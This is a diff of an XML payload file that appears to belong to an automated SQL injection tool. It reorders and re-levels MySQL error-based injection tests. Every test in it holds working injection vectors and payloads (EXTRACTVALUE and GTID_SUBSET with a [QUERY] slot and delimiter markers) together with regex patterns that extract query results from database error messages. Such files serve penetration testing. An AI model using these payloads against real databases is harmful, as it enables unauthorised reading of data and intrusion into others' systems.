@@ -3,6 +3,95 @@
 <root>
     <!-- Error-based tests - WHERE, HAVING, ORDER BY or GROUP BY clause -->
     <test>
+        <title>MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)</title>
+        <stype>2</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>AND EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))</vector>
+        <request>
+            <!-- These work as good as ELT(), but are longer
+            <payload>AND EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]'))</payload>
+            <payload>AND EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (MAKE_SET([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))</payload>
+            -->
+            <payload>AND EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.1</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)</title>
+        <stype>2</stype>
+        <level>1</level>
+        <risk>3</risk>
+        <clause>1,2,3,8,9</clause>
+        <!-- Despite this is an OR payload, keep where to 1 because otherwise it will not work when injecting in ORDER BY or GROUP BY -->
+        <where>1</where>
+        <vector>OR EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))</vector>
+        <request>
+            <!-- These work as good as ELT(), but are longer
+            <payload>OR EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]'))</payload>
+            <payload>OR EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (MAKE_SET([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))</payload>
+            -->
+            <payload>OR EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.1</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)</title>
+        <stype>2</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>AND GTID_SUBSET(CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM])</vector>
+        <request>
+            <payload>AND GTID_SUBSET(CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM])</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.6</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)</title>
+        <stype>2</stype>
+        <level>2</level>
+        <risk>3</risk>
+        <clause>1,8,9</clause>
+        <where>1</where>
+        <vector>OR GTID_SUBSET(CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM])</vector>
+        <request>
+            <payload>OR GTID_SUBSET(CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM])</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.6</dbms_version>
+        </details>
+    </test>
+
+    <test>
         <title>MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)</title>
         <stype>2</stype>
         <level>4</level>
@@ -88,46 +177,6 @@
         <details>
             <dbms>MySQL</dbms>
             <dbms_version>&gt;= 5.5</dbms_version>
-        </details>
-    </test>
-
-    <test>
-        <title>MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)</title>
-        <stype>2</stype>
-        <level>1</level>
-        <risk>1</risk>
-        <clause>1,2,3,8,9</clause>
-        <where>1</where>
-        <vector>AND GTID_SUBSET(CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM])</vector>
-        <request>
-            <payload>AND GTID_SUBSET(CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM])</payload>
-        </request>
-        <response>
-            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
-        </response>
-        <details>
-            <dbms>MySQL</dbms>
-            <dbms_version>&gt;= 5.6</dbms_version>
-        </details>
-    </test>
-
-    <test>
-        <title>MySQL &gt;= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)</title>
-        <stype>2</stype>
-        <level>1</level>
-        <risk>3</risk>
-        <clause>1,8,9</clause>
-        <where>1</where>
-        <vector>OR GTID_SUBSET(CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM])</vector>
-        <request>
-            <payload>OR GTID_SUBSET(CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM])</payload>
-        </request>
-        <response>
-            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
-        </response>
-        <details>
-            <dbms>MySQL</dbms>
-            <dbms_version>&gt;= 5.6</dbms_version>
         </details>
     </test>
 
@@ -238,55 +287,6 @@
         <details>
             <dbms>MySQL</dbms>
             <dbms_version>&gt;= 5.0</dbms_version>
-        </details>
-    </test>
-
-    <test>
-        <title>MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)</title>
-        <stype>2</stype>
-        <level>1</level>
-        <risk>1</risk>
-        <clause>1,2,3,8,9</clause>
-        <where>1</where>
-        <vector>AND EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))</vector>
-        <request>
-            <!-- These work as good as ELT(), but are longer
-            <payload>AND EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]'))</payload>
-            <payload>AND EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (MAKE_SET([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))</payload>
-            -->
-            <payload>AND EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))</payload>
-        </request>
-        <response>
-            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
-        </response>
-        <details>
-            <dbms>MySQL</dbms>
-            <dbms_version>&gt;= 5.1</dbms_version>
-        </details>
-    </test>
-
-    <test>
-        <title>MySQL &gt;= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)</title>
-        <stype>2</stype>
-        <level>1</level>
-        <risk>3</risk>
-        <clause>1,2,3,8,9</clause>
-        <!-- Despite this is an OR payload, keep where to 1 because otherwise it will not work when injecting in ORDER BY or GROUP BY -->
-        <where>1</where>
-        <vector>OR EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))</vector>
-        <request>
-            <!-- These work as good as ELT(), but are longer
-            <payload>OR EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]'))</payload>
-            <payload>OR EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (MAKE_SET([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))</payload>
-            -->
-            <payload>OR EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))</payload>
-        </request>
-        <response>
-            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
-        </response>
-        <details>
-            <dbms>MySQL</dbms>
-            <dbms_version>&gt;= 5.1</dbms_version>
         </details>
     </test>
 
@@ -987,7 +987,7 @@
     <test>
         <title>MySQL &gt;= 5.6 error-based - Parameter replace (GTID_SUBSET)</title>
         <stype>2</stype>
-        <level>2</level>
+        <level>3</level>
         <risk>1</risk>
         <clause>1,2,3,9</clause>
         <where>3</where>
@@ -1276,7 +1276,7 @@
     <test>
         <title>MySQL &gt;= 5.6 error-based - ORDER BY, GROUP BY clause (GTID_SUBSET)</title>
         <stype>2</stype>
-        <level>2</level>
+        <level>3</level>
         <risk>1</risk>
         <clause>2,3</clause>
         <where>1</where>
